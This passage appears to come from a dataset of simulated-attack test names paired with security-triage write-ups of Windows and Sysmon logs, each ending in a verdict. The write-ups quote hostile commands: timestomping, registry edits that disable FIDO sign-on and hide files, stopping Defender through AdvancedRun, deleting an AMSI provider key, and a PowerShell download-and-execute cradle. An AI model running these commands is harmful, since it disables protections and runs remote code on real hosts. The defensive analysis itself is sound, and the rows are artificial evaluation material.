  - Cross-verify with any automated security systems' logs if any alert correlating with this timeframe was generated.
  - Investigate the usage patterns of the `admin_test` user account and confirm any authorized use of PowerShell, tasks needing high privileges, and logons from specific network addresses.
  - Check for any other suspicious correlating activities on the particular machine (`DESKTOP-3HL5B2P`).
  - Conduct a review of Powershell command lines, especially any scripts or encoded commands, for potentially malicious actions.

Given these findings, it's important to verify activities involving the `admin_test` account for potential compromise or misuse of privileges."
Windows - Modify file creation timestamp with PowerShell,"The given logs provide a comprehensive view of processes and activities occurring on the Windows host, specifically Server002, over a brief period.

**Suspicious or Anomalous Behavior:**
1. **PowerShell Execution**:
   - There is a PowerShell command in the logs: `powershell.exe & {Get-ChildItem \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.006_timestomp.txt\"" | % { $_.CreationTime = \""01/01/1970 00:00:00\"" }}`
   - This command is modifying the creation time of files, which is a technique called ""timestomping."" This technique is often used by attackers to alter file timestamps to evade detection by making files appear innocuous.

2. **Use of `conhost.exe` and `wevtutil.exe`**:
   - `conhost.exe` and `wevtutil.exe` appear multiple times in short succession and are executed by the `admin_test` user. `wevtutil.exe` can be used to clear event logs, which may be an attempt to cover tracks.
   - Frequent creation of `conhost.exe` might be indicative of process manipulation or the creation of a console session to execute something covertly in the background.

3. **Integrity Level of Processes**:
   - Processes are being run with a ""High"" integrity level under the `admin_test` user account, which might suggest potential privilege escalation or use of administrative privileges.

4. **Microsoft Edge Update Activity**:
   - There are multiple activities related to `MicrosoftEdgeUpdate.exe`, executed by `NT AUTHORITY\SYSTEM`. While updates do check for the latest versions, an intense burst of processes in such a short timeframe might need confirmation for legitimacy. However, this is typical behavior when legitimate updates happen.

5. **Time Changes**:
   - The system time is adjusted with events from svchost.exe, which is a legitimate system process but adjusting time could be part of some nefarious activity, like facilitating certain time-based actions or logs management.

**Conclusion**:
- **PowerShell Script**: The PowerShell script used for timestomping suggests potential malicious activity, as it’s modifying timestamps, an action typically associated with malicious intent to obfuscate initial attack footprints.
- **Overall Activity**: The combination of timestomping, frequent process creation and executions, and alteration of system settings (such as logs via wevtutil) strengthens the suspicious nature of these actions.

**Resolution**: **SUSPICIOUS**

While there is no definitive proof of compromise or malicious intent in all events, certain activities warrant additional scrutiny, particularly those involving timestomping via PowerShell and log-clearing operations. Immediate recommendations include:
- Conduct a thorough investigation into the `admin_test` account’s activities.
- Review the use of PowerShell scripts on the host.
- Monitor and possibly restrict the use of high-integrity level processes.
- Validate updates of Microsoft Edge for authenticity and ensure no unnecessary configuration changes occurred.

Further investigation and possible containment measures may be needed based on deeper threat analysis findings."
Odbcconf.exe - Load Response File,"Based on the review of the provided log entries, several key activities stand out as potentially concerning or requiring further investigation:

### Observations:
1. **Multiple High-Integrity Process Executions**:
   - Multiple instances of `setup.exe` related to Microsoft Edge Update and Edge Installer are observed, indicating potential updates or installations. These processes have been executed with system-level privileges.
   - High frequency of `wevtutil.exe` and `conhost.exe` processes which can indicate tampering or extraction of event logs, possibly to cover tracks.

2. **Use of Windows Eventing Utility (`wevtutil.exe`)**:
   - The presence of `wevtutil.exe` at `C:\Windows\System32\wevtutil.exe` multiple times, particularly its use to export logs (`epl` command), can indicate log tampering or an attempt to export event logs for further analysis outside of the system's native capabilities.

3. **Execution of Command-Line Scripts with `cmd.exe`**:
   - A command (`""cmd.exe"" /c cd ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.008\\bin\\"" & odbcconf.exe -f ""data.008.rsp""`) carried out by `cmd.exe` which is not typical for a standard application operation. The use of `odbcconf.exe` may indicate manipulation of ODBC Data Source Names and requires further investigation.

4. **Use of Debugging and Impersonation Privileges**:
   - Instances where the `admin_test` user has privileges such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, and `SeLoadDriverPrivilege` granted, which are generally associated with higher risk and should be verified if appropriate for that user.

### Assessment:
- **SUSPICIOUS**:
  The activities outlined indicate potentially suspicious behaviors:
  - The frequent and aggressive use of privileged processes and system utilities determine a need for more context around these actions.
  - Specifically, exporting logs and installing services suggest a thorough inspection to determine if this correlates with legitimate administrative activities or could potentially involve preparation for or execution of malicious actions.

### Guidance:
1. **Verify Legitimacy**:
   - Confirm whether the process executions and privilege usage align with scheduled updates or legitimate administrative activities.
   
2. **Cross-Examine Log Activities**:
   - Check if there are any corresponding help-desk tickets or administrative change requests that align with these logs.

3. **Network and Host Monitoring**:
   - Enhanced monitoring for further activities from the `SERVER002` host.
   - Inspect network traffic from associated IPs (if available) during these timeframes, particularly for unauthorized data exfiltration.

4. **Inspect for Presence of Known Threats**:
   - Perform a security audit on configurations involving ODBC sources that were targeted by the command line script.
   - Verify the binary integrity and check for potential implant or backdoor signatures in relevant executables involved (`setup.exe`, `odbcconf.exe`, `wevtutil.exe`).

5. **User Credentials and Account Audit**:
   - Re-assess `admin_test` user account permissions and monitor for any further suspicious activities.

Additional investigation is recommended to establish the context or confirm potential compromise. Given the complexities and possible risks involved, leaning towards a cautious approach is advisable."
Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value,"**Detailed Analysis of the Logs:**

Upon reviewing the provided Sysmon event logs, a few activities warrant closer attention:

1. **Microsoft Edge Update Activities:**
   - Multiple logs indicate the execution of Microsoft Edge Update components, such as `MicrosoftEdgeUpdateSetup.exe` and `MicrosoftEdgeUpdate.exe`. These actions commonly include updating or registering services and are expected for maintaining browser updates.
   - The use of directories like `C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\...` and the legitimate file paths and company names suggest normal update behavior.
   
2. **Registry Modification:**
   - There’s a series of logs reporting the execution of command-line processes, notably `cmd.exe` and `reg.exe`, modifying the registry. The command executed was:
     ```
     reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f
     ```
   - This action is noteworthy as altering registry keys related to security policies like FIDO (Fast Identity Online) could indicate an attempt to weaken security on the host.

3. **Unusual Process Execution:**
   - `wevtutil.exe` and `conhost.exe` were executed multiple times by the user `SERVER002\\admin_test`. While these processes are legitimate, their frequent execution in a short time may indicate attempts to manage event logs or operate consoles non-interactively, pointing to potential obfuscation or lateral movement activities.

4. **Processes Executed by SYSTEM User:**
   - Several processes, including Windows system updates and Edge-related updates, were run under the `NT AUTHORITY\\SYSTEM` user. This execution level is typical during legitimate software update cycles but requires scrutiny to ensure no unauthorized actions occur under these privileges.

**Assessment of the Situation:**
- **Benign Signs:** Many entries related to Microsoft Edge Update appear conventional and align with its built-in auto-update functionalities.
- **Suspicious Indicators:** The registry modification using high-privilege accounts indicates an attempt to alter security settings, which should be verified to rule out policy violations or misconfigurations.
- **High-Privilege Process Executions** involving `wevtutil.exe`, `reg.exe`, and related processes like `cmd.exe` hint at potential misconfigurations or malicious intent where privilege escalation could be attempted.

**Recommendation:**
- **Conduct a Review:** Investigate the justification for registry changes by contacting the relevant IT staff or users to determine whether authorized processes, such as application installations or policy updates, necessitated these actions.
- **Monitor the Server:** Enable additional monitoring to capture any further registry-related activities and process executions, particularly those executed under elevated privileges by `admin_test`.
- **Run Antivirus and Security Scans:** Perform comprehensive virus and malware scans to ensure the system's integrity.

**Final Resolution: SUSPICIOUS**
The logs contain registry modification activity that doesn't look right and requires additional investigation to verify the authenticity and authorization of the changes made to ensure no security policies are violated or compromised."
Disable Defender Using NirSoft AdvancedRun,"In reviewing the provided Windows and Sysmon event logs, there are several noteworthy observations related to potential malicious activity, specifically concerning the use of PowerShell and command-line executions:

1. **PowerShell Execution**: 
   - There are multiple instances of PowerShell being invoked with specific command-line arguments indicative of an attempt to manipulate system services:
     - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` running a script involving `AdvancedRun.exe` to execute commands like `stop WinDefend`.
     - Efforts to bypass security features (`WinDefend` refers to Windows Defender) are often a sign of malicious intent.

2. **AdvancedRun Execution**:
   - `AdvancedRun.exe` is being used to run the system executable `sc.exe` with the command `stop WinDefend`, which decisively attempts to disable Windows Defender.
   - The chain of execution from PowerShell to CMD to AdvancedRun indicates a complex attempt to elevate privileges and disable a critical security component (Windows Defender).

3. **Application Logs**:
   - The logs involve instances where certain services are stopped, but specific details related to these applications indicate deliberate attempts to interfere with Windows security services.
   - There appears to be an effort to execute scripts that modify or disable key security features of the system.

4. **Shell Commands**:
   - Executing `HOSTNAME.EXE` and `whoami.exe` is generally harmless, but in the context of the other activities present, it may suggest enumeration attempts to gather system information, possibly indicative of reconnaissance in a malware infection.

5. **Analysis of User `admin_test`**:
   - The actions, including the execution of potentially harmful scripts by the user `SERVER002\admin_test`, suggest that this account may either be compromised or misused for such activities.

### Assessment and Recommendation
Based on the analysis, there is an evident pattern of suspicious activity that aligns with common indicators of compromise. Specifically, the disabling of Windows Defender via PowerShell and the use of an external tool (`AdvancedRun.exe`) strengthen the case for potential malicious intent.

### Resolution: **MALICIOUS**

Given the logs indicate attempted or successful disabling of security measures on the system, immediate actions should be taken:
- **Isolate the Host**: Temporarily disconnect 'Server002' from the network to prevent potential spread or data exfiltration.
- **Conduct a Full Malware Scan**: Utilize a trusted malware scanner to perform a deep scan of the system.
- **Review User and Access Logs**: Inspect logs related to 'admin_test' for unusual login times or access patterns.
- **Examine File System**: Look for newly created or modified files during the time window of the logs.
- **Update Security Policies**: Strengthen logging and monitoring policies to catch such activities in the future.
  
These actions will help in containing any present threat and understanding its source and impact."
Modify UsePIN Registry entry,"Upon reviewing the provided Windows event logs, I have conducted a thorough analysis for potential indicators of compromise or suspicious activities. Here are the key points of the log evaluation:

### Application Log Analysis:
- The events in the Application log indicate routine activities. The `edgeupdate` service mentioned as ""Service stopped"" is likely related to routine operations of updating Microsoft Edge and not indicative of malicious activity.

### System Log Analysis:
- The logs record logs related to time synchronization activities, which are typical events related to system clock adjustments. The processes involved, primarily `svchost.exe`, are integral to Windows operations and conducted under ""LOCAL SERVICE"" and ""NT AUTHORITY"" accounts, indicating routine system activities.

### Sysmon Log Analysis:
- Sysmon logs show a series of executions of system utilities like `whoami.exe`, `wevtutil.exe`, `cmd.exe`, and others by a user `SERVER002\admin_test`. While command-line interfaces (CLI) are normal for administrative tasks, the specific use of `cmd.exe` for registry modifications (e.g., modifying BitLocker settings with `reg.exe`) could be suspicious if not expected.
- The frequent execution of `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and related processes under the `NT AUTHORITY\SYSTEM` account appears related to legitimate Edge updates.
- However, there is repeated launching of `cmd.exe` with a command to modify the registry, which involves BitLocker policies. Such operations should typically be documented and discussed with system administrators to verify legitimacy.

### Security Log Analysis:
- Events in the Security log correlate with time adjustments and show no signs of suspicious unauthorized access or privilege escalation. The activities are tied to legitimate system processes.

### Conclusion & Resolution:
- The primary concern is the registry modification through `cmd.exe`, which could be part of a legitimate process if it aligns with administrative tasks like system updates or policy changes. However, without context, it stands out as potentially suspicious.
- There's no clear-cut evidence of malicious activities like unauthorized access, privilege escalation, or external command execution. However, verification of the registry modifications, especially if related to security settings, should be confirmed with the system administrator.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Verification with Administrator**: Confirm with the system administrators whether the registry modifications seen in the logs are part of expected updates or changes.
2. **Review Change Management**: Check documentation or change management records to confirm that modifications to BitLocker policies were authorized and correctly implemented.
3. **Increased Monitoring**: Enhance monitoring for further occurrences of these command executions, especially those affecting registry settings.
4. **Conduct a Risk Assessment**: Evaluate the need for multi-factor authentication or security training for accounts capable of making such changes, to prevent misuse.

In summary, while there are no definitive indicators of compromise, the possibility of unauthorized or unexpected registry changes warrants further investigation."
Makes Eventlog blind with Phant0m,"Based on the review of the various event logs provided for Server002, here is a detailed analysis:

1. **Analysis of Activity:**
   - The majority of the processes executed are standard Windows processes, such as `conhost.exe`, `svchost.exe`, `sppsvc.exe`, `wsmprovhost.exe`, and `MicrosoftEdgeUpdate.exe`. These are generally associated with legitimate operations and system tasks.
   - Particular attention was given to the execution of `cmd.exe` with a potentially unclear script: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\script.exe""`, executed by the `admin_test` user. This activity stands out because of its location in the temporary directory and because it involves running a script potentially not visible or familiar to standard monitoring.
   - The process execution pattern shows a repeated occurrence of `MicrosoftEdgeUpdate.exe` which appears consistent with a system or application update process, with no evident deviations or malicious indications associated with standard hash values and command lines.
   - The usage of administrative privileges, as indicated by the presence of `SeDebugPrivilege` among others in event ID 4672, is usual for system processes involving the `SYSTEM` user, especially during updates or maintenance windows.

2. **No Clear Malicious Indicators:**
   - Most other entries depict normal system behavior such as updating Microsoft Edge, logging standard processes, and running scheduled tasks. There's no direct evidence of privilege escalation attacks or exploitative activities such as executing known malicious binaries, unexpected persistence mechanisms, or unauthorized exfiltration attempts.
   - The presence of logs for security updates, such as `TiWorker.exe` and `TrustedInstaller.exe`, further indicates usual operations consistent with system maintenance activities.
   - Security log events like ID 4624 (Logon) and ID 4672 (Privileged Account Used) are typical entries without irregular patterns suggesting compromise.

3. **Less Suspicious Activities:**
   - The invocation of `whoami.exe` and `hostname.exe` appear benign as these commands are often used for diagnostics or routine checks during remote sessions by administrators.

4. **Resolution:**
   - **SUSPICIOUS**: While there is no clear evidence of malicious activities, the presence and execution of scripts from obscure temporary directories necessitate further scrutiny. This would involve understanding the context around these scripts, reviewing the script content, comparing it against the expected behavior for such scripts, and ensuring they align with legitimate administrative tasks.

**Next Steps:**
- **Verify the Purpose of the `script.exe`**: Investigate the specific purpose of the `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\script.exe""` script and determine its origin, authorization, and hash values to check for known threats. 
- **Employee/User Verification**: Ensure that the account `SERVER002\\admin_test` is involved in legitimate activities and the execution was intentional.
- **Continuous Monitoring**: Continue to monitor for any unusual outbound connections or data movements in case of delayed or stealth exfiltration attempts.

In conclusion, marking this as **SUSPICIOUS** encourages a slightly cautious stance, demanding further inspection but with awareness that the majority of activities observed are benign."
Hide Files Through Registry,"### Detailed Analysis

#### 1. **Time Change Events:**
- **Event ID 24 and 1, in both System and Security Logs**: The time change events, identified by Kernel-General and Security-Auditing logs, are initiated by the `svchost.exe` process running under the `LOCAL SERVICE` account. The NTP server `time.windows.com` is selected as the time source.
- These events appear benign as they relate to the Windows Time Service adjusting the system clock, which is a regular action on systems to keep correct time synchronization.

#### 2. **Process Execution:**
- **Sysmon Event ID 1 and Event ID 5 in the Sysmon Logs:**
  - **`wevtutil.exe` and `conhost.exe`:** Wevtutil is being invoked by the user `SERVER002\admin_test`. The presence of event entries for wevtutil and conhost is common, as they are associated with Windows functionalities and command terminal hosting respectively.
  - **`hostname.exe` and `whoami.exe`:** Both are legitimate Windows commands run by a user with `High` integrity level. Hostname checks the system's hostname, and whoami displays the current logged-in user information. The command execution context appears routine.
  - **Registry Modification (cmd.exe and reg.exe)**: Two registry commands run from `cmd.exe` as observed here:
    ```
    reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f
    ```
    and
    ```
    reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f
    ```
  This suggests an attempt to modify visibility of hidden system files, which could signal suspicious activity. However, since the commands have legitimate goals and are executed with `SERVER002\admin_test` authority, without further context, this is marked as **suspicious but not explicitly malicious**.

#### 3. **Edge Update Activities:**
- The Application log contains entries from `edgeupdate` service, which is responsible for updating Microsoft Edge. Various updates and processes related to Edge Update, such as:
  - `MicrosoftEdgeUpdateSetup.exe`
  - `MicrosoftEdgeUpdate.exe` performing typical installation tasks.
- The Edge Update activity specifically matches expected Microsoft update behavior with valid digital signatures and update pathways, therefore appearing **benign**.

### Assessment & Recommendations
- **Suspicious Activities:** The registry modifications raise concerns about potentially adjusted visibility settings. It requires confirmation of the user `SERVER002\admin_test` intending to perform this operation.
- **Benign Activities:** The rest of the activities such as time synchronization, Edge Updates, and routine command executions appear benign and consistent with expected system operations.

### Final Resolution:  
- **Resolution: SUSPICIOUS**

Further investigation into the registry changes should be performed to understand the context and intent, ensuring the changes align with authorized actions within this environment."
Disable Windows Auto Reboot for current logon user,"After analyzing the provided Windows event logs, the following observations and conclusions can be drawn:

### Observations:

1. **Time Change Events**:
   - Multiple events from the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` indicate that there was a change in system time. This is a legitimate activity that can occur during normal operations, such as synchronization with time servers, especially for systems set to update time settings automatically.

2. **Process Executions by Admin User**:
   - Execution of standard Windows processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`. The `cmd.exe` process involved modifying registry settings to prevent automatic reboots when users are logged on, which might suggest script or administrative tool use.
   - The `whoami.exe` was executed, which is a common command to verify user permissions but can also be used to escalate privileges or by scripts to check execution context.

3. **EdgeUpdate Activities**:
   - A significant number of events indicate the execution of `MicrosoftEdgeUpdate.exe` and other related components. These processes appear to be legitimate operations related to updating Microsoft Edge. These updates are initiated by the `NT AUTHORITY\ SYSTEM` user, which is typical for system-level update operations. Furthermore, the logs show a service stopping which aligns with typical update behaviors.

4. **Registry Modification**:
   - `reg.exe` was used to modify a registry key related to Windows Update behavior. While this can be suspicious, it is also common for scripts or IT teams to adjust auto-reboot settings to prevent disruptive reboots during active user sessions.

5. **Integrity Levels**:
   - Processes executed by the user `SERVER002\admin_test` have a high integrity level, indicating they are operating with administrative privileges.

6. **No Irregular Command-line Arguments**:
   - The command lines captured in the Sysmon logs for the executed processes do not show any overt signs of malicious or unauthorized software execution.

### Assessment:
Based on the analysis of the logs, there are no explicit indicators of compromise or malicious activity evident. The observed registry modification and use of system utilities like `whoami`, `cmd`, and `reg` reflect potential administrative activities or routine system maintenance.

### Conclusion:
- **Resolution: BENIGN**

The events captured in the logs appear to reflect legitimate system and administrative activities, with no clear signs of malicious behavior. This indicates the activity observed is benign and does not necessitate further investigation unless additional context or external indicators suggest otherwise. However, maintaining vigilance for any anomalies and ensuring security monitoring remains active is recommended."
Windows HideSCANetwork Group Policy Feature,"Upon reviewing the provided Windows event logs, the following observations and analysis have been made:

### Analysis:

1. **Frequent Execution of Known Processes**: 
   - The logs show multiple instances of routine processes such as `whoami.exe`, `conhost.exe`, `svchost.exe`, and `wevtutil.exe` being executed, mostly under the user ""SERVER002\\admin_test"". These processes are standard on Windows systems and are often used for benign administrative tasks. However, frequent use of these utilities can sometimes indicate an investigation or system enumeration effort, especially if executed in quick succession.

2. **Microsoft Edge Update**:
   - Numerous logs reference operations related to `MicrosoftEdgeUpdate.exe`. The activities seem to be part of a regular update process for Microsoft Edge, evidenced by the process execution under the `NT AUTHORITY\SYSTEM` account with appropriate file versions and descriptions. System and software updates often trigger such logs and do not inherently indicate malicious activity.

3. **Registry Modification via Command Line**:
   - A command executed by `cmd.exe` with the command line `reg add ... /v HideSCANetwork /t REG_DWORD /d 1 /f` is recorded. This action modifies the Windows registry which could potentially be used to alter system settings. While modifying registry keys isn’t inherently malicious, doing so can be a tactic employed in system misconfigurations or persistence mechanisms used by malicious actors.
   - The activity was initiated by the user ""SERVER002\\admin_test"", implying a user with administrative level execution, which may not be unusual in legitimate administrative tasks.

4. **Network Configuration Change Potential**:
   - The above registry modification aims to change settings under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` which may relate to network configurations or visibility settings. However, without additional context or known negative consequences, this cannot be definitively labeled as malicious.

5. **Usage of High-Integrity Level**:
   - Processes running at a high integrity level are observed, including those involving registry changes, performed by a user likely to have administrative privileges. This is typical for administrative tasks but also common during certain attack vectors when privilege escalation is involved.

### Assessment:

- **Benign Indicators**: Regular operations by Microsoft Edge are seen, likely part of its normal update cycle, supported by names, file versions, and typical update paths.
  
- **Potentially Suspicious Activity**: The registry modification using command-line interface under administrative user context stands out as requiring further scrutiny. Such activity is often legitimate, but consistency with intended administrative policy or operations should be confirmed.

### Conclusion:

The logs present typical background activity for system utilities and Microsoft Edge update operations. However, the registry modification recorded is slightly unusual, particularly if it falls outside standard administrative procedures. Therefore, a prudent approach is to verify the necessity and authorization for such modifications in your environment.

### Resolution: SUSPICIOUS

It is recommended to:
- Confirm the legitimacy and authorization of the registry change with the administrative department.
- Ensure this user and system configuration aligns with internal policies.
- Consider additional monitoring for similar activities to preemptively identify unauthorized changes."
Execution from Compressed File,"After carefully analyzing the provided logs, several observations and assessments can be made:

### Suspicious or Anomalous Behavior:
1. **Unusual Process Execution:**
   - The frequent and rapid execution of processes such as `powershell.exe`, `wevtutil.exe`, and `cmd.exe` under the user `SERVER002\admin_test` may not be typical for regular activity and can denote suspicious behavior if they weren’t initiated by a known administrator action. These tools are commonly used in administrative tasks as well as for malicious purposes, especially if not accompanied by legitimate command-line inputs.

2. **Command Execution:**
   - The specific `cmd.exe` command `/c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\temp_data.zip\data.exe""` suggests execution of an executable extracted from a compressed file in a temp directory, which is often atypical and could be malicious. This directory is usually utilized during an attack for downloading and executing malicious payloads.

3. **Process Lineage:**
   - The `data.exe` process, appearing seemingly from a user directory, executed `calc.exe` (a known living-off-the-land binary) could signify a process chain indicative of a potentially suspicious behavior where attackers attempt to live-off-the-land by leveraging existing Windows utilities to perform malicious tasks.

4. **High-Integrity Processes:**
   - Many processes, including `whoami.exe` and `cmd.exe`, are executed with High Integrity, suggesting an elevated privilege level. While this can be standard under certain administrative use cases, the combination with the other observations increases the anomaly level.

### Potential Indicators of Malicious Activity:
- The execution and lineage of these processes, particularly the invocation from within the temp directory, align with tactics to initiate undesired actions covertly. If these processes weren't expected or aligned with scheduled administrative actions, they could be part of a structured attempt to run unauthorized scripts or software.

- The creation of temp files and subsequent executions within the temp directory is a known method for attackers to introduce and execute malicious code.

### Threats or Risks Identified:
- Potential unauthorized access or execution of scripts.
- Possible lateral movement or privilege escalation through the use of administrative tools executed in atypical sequences.

### Final Assessment:
- **Resolution: SUSPICIOUS**
  - While none of the individual log entries definitively confirm malicious activity without further context, the cumulative suspicious behavior of running unusual processes in rapid sequence, particularly from the temp directory, warrants further investigation. 

### Guidance on Proceeding:
1. **Verify Legitimacy:**
   - Confirm whether the observed activities were scheduled or executed by legitimate administrators with valid reasons.
   
2. **Check for Indicators of Compromise (IOCs):**
   - Look for other known IOCs related to the executed binaries, particularly `data.exe` or any less-known executables during the given timeline.
   
3. **Further Monitoring:**
   - Implement tighter monitoring around the `SERVER002\admin_test` account, particularly focusing on future activities involving the execution of scripts or administrative utilities.
   
4. **Forensic Investigation:**
   - If not administratively verified, a forensic investigation should be conducted on the image of the machine or specific executions for unauthorized access or further propagation within the network.

This assessment suggests raising an alert to the security team to inspect this system more closely and determine whether additional corrective actions or mitigations are required."
Invoke HTML Application - JScript Engine with Inline Protocol Handler,"Upon analyzing the Windows event logs provided, several observations and assessments can be made:

1. **Process Execution**:
   - There are multiple instances of common Windows utilities and processes executed, such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe`.
   - A notable point of interest is the command executed with PowerShell: `""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe}`. This usage suggests an attempt to utilize HTML Application (HTA) via PowerShell, which is a known tactic used by attackers for executing arbitrary code. The use of `mshta.exe` can often be associated with malicious activity.

2. **Privilege Level**:
   - The processes executed by `NT AUTHORITY\SYSTEM` indicate high privilege, which is normal for system update operations but can be abused if an attacker gains such access.

3. **Indicators of Potential Malicious Activity**:
   - The usage of PowerShell with JScript and `mshta.exe` is suspicious and a common technique in several attack scenarios to bypass traditional security controls and execute scripts.
   - There is also consistent execution of `wevtutil.exe`, which can be used for clearing logs, although there is no direct indication in this log set that logs were actually cleared.

4. **Other Processes**:
   - The presence of processes related to Microsoft Edge (`setup.exe`) seems to be part of a normal update routine given their execution under `NT AUTHORITY\SYSTEM`, though it is important to verify these installations or updates against scheduled tasks or known software updates.

5. **Anomalous Command Lines**:
   - PowerShell command using the `Invoke-ATHHTMLApplication` function stands out for its complexity and potential misuse.

**Assessment**:
- **Overall Risk**: The key suspicious event is the usage of PowerShell to execute a script with `mshta.exe`, which is unusual in normal operational context and suggests that there might be an attempt to download or execute a payload without being detected.
- **Threat Level**: SUSPICIOUS - The activity needs further investigation to confirm whether it is a part of legitimate administrative scripts or tasks, or indeed a suspicious activity indicating potential compromise.

**Guidance on How to Proceed**:
1. **Investigate the Origin of PowerShell Execution**: Attempt to trace back the activity to determine if it aligns with authorized scripts or processes. Check for any known vulnerabilities or pending updates that might coincide with this occurrence.
2. **Review Scheduled Tasks and Policies**: Ensure that the processes and command lines align with expected behavior, especially concerning updates or administrative tasks.
3. **Monitor Further Activity**: Implement closer monitoring of PowerShell and HTA applications, with alerting set up for any repeats of similar command lines.
4. **Check Network Traffic and Logs**: Look for any anomalous outbound connections around the time of these events to determine if there is any data exfiltration or command-and-control traffic.
5. **Verify System Integrity**: Conduct a thorough inspection for other known indicators of compromise, exploring beyond these logs to verify system integrity.

Based on the analysis, the resolution for this set of logs is **SUSPICIOUS**. Further investigation is needed to clarify the nature and intent of the PowerShell commands observed."
WinPwn - Kill the event log services for stealth,"Upon reviewing the provided Windows event logs across different channels, several entries indicate unusual or potentially malicious activity:

1. **Sysmon Log:**
   - The execution of `powershell.exe` with a command line that includes `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')`. This command is suspicious because it downloads a script from a web URL and executes it directly in PowerShell. This behavior is typical of script-based attacks and could be indicative of a phishing or malicious script execution.
   - The high integrity level of the executed PowerShell process suggests it might have administrative privileges, making it more concerning.
   
   - The repeated occurrence of the `MicrosoftEdgeUpdate.exe` processes, with various switches like `/svc`, `/update`, `/ping`, may not necessarily indicate malicious behavior by themselves, as they could be related to legitimate auto-update mechanisms for Microsoft Edge. However, thorough inspection is warranted to rule out misuse, especially since the network-based execution environment has been involved.

2. **PowerShell Logs:**
   - The `HostApplication` field reveals the same suspicious PowerShell command with `iex` and `downloadstring`. This serves as a confirmation of the PowerShell command execution observed in the Sysmon logs. The command's intent to download and run a script from an external source without apparent user interaction strengthens the hypothesis of potentially malicious activity.

3. **Application Log:**
   - The entries under `edgeupdate` and `SecurityCenter` do not indicate overtly suspicious behaviors. They appear normal, related to service activities and security product state rather than malicious activities.

**Assessment of the Situation:**
The presence of an Internet-based PowerShell script execution indicates a concrete risk and potential compromise. This activity should be presumed malicious unless proven otherwise. The interactions and nature of the downloaded script from GitHub must be investigated further to assess potential damages or information exposure.

**Threats or Risks Identified:**
- Execution of potentially harmful scripts downloaded from an external source may lead to sensitive data exfiltration, unauthorized access, or system misuse.
- The actor may gain escalated privileges through the PowerShell script execution.

**Guidance on How to Proceed:**
- Immediately isolate the affected machine from the network to prevent further potential spread or data exfiltration.
- Conduct a comprehensive forensic investigation to determine the impact of the executed script, examining existing system files, configurations, and network logs.
- Hunt through the network for other instances of this indicator (`WebClient.DownloadString`) being executed to identify possibly affected systems.
- Reset credentials for `SERVER002\\admin_test` user and monitor activity for further anomalies.
- Engage with your threat intelligence team to analyze the script downloaded from GitHub and to collaborate on an IOC (Indicators of Compromise) sharing initiative.

**Resolution:**
MALICIOUS - The logs contain definitive indicators of malicious activity, notably with the execution of an external script through PowerShell."
AMSI Bypass - Remove AMSI Provider Reg Key,"After carefully examining the provided Windows event logs, here are the findings:

### Analysis:
1. **PowerShell Execution:**
   - The logs indicate the execution of a PowerShell command that modifies the Windows registry: `Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse`.
   - This command attempts to remove specific AMSI (Antimalware Scan Interface) Providers from the registry, which is considered suspicious as it may indicate an attempt to disable antimalware features, often a tactic used by malware to avoid detection.

2. **Process Activities:**
   - There are several instances of typical Windows processes such as `svchost.exe`, `conhost.exe`, and `wevtutil.exe` being executed. These are normal system operations and do not indicate malicious activities on their own.
   - The `MicrosoftEdgeUpdate.exe` process has various instances and updates which appear to be regular update processes for Microsoft Edge.

3. **Time Synchronization:**
   - The logs show entries related to time adjustments which are typical from `time.windows.com`. No suspicious activity observed in time change logs.

4. **Edge Update Services:**
   - Consistent logs related to Microsoft Edge Update operations, involving installation and registration processes. These are normal if legitimate updates are being applied.

### Conclusion:
The primary indicator of potential malicious activity is the PowerShell command attempting to remove a registry key related to AMSI Providers. This is a common technique used to evade security mechanisms and might indicate that a compromise is being attempted or conducted.

### Resolution:
- **Resolution:** SUSPICIOUS

### Guidance:
1. **Further Investigation:**
   - Examine the context of the PowerShell command execution. Determine how and why `admin_test` user executed these commands, and whether it was authorized activity.
   - Analyze network activity from the system during and after the PowerShell command execution to see if there was any outgoing malicious traffic.

2. **Immediate Actions:**
   - Re-enable any disabled security features and conduct a full antimalware scan on Server002.
   - Monitor for further unauthorized PowerShell activity and access from the `admin_test` account.

3. **Logging & Alerting:**
   - Strengthen logging and alerting for PowerShell and any changes to AMSI configurations to detect and respond to such activities swiftly in the future.

4. **User Education:**
   - Provide training or reminders to users, especially those with elevated privileges, on the importance of adhering to security policies and recognizing unauthorized changes/commands.

These steps aim to ensure adequate scrutiny and containment of potentially malicious activities."
Adding custom paths for application execution,"Upon reviewing the provided Windows event logs, the following observations and analysis can be made:

### Analysis Summary:
- **Logs Reviewed**: The logs reviewed include the Windows PowerShell log, System log, Sysmon log, Application log, and Security log. Notably, the most information is extracted from the Sysmon and Security logs.
  
### Observations and Potential Indicators of Malicious Activity:

1. **System Activity**:
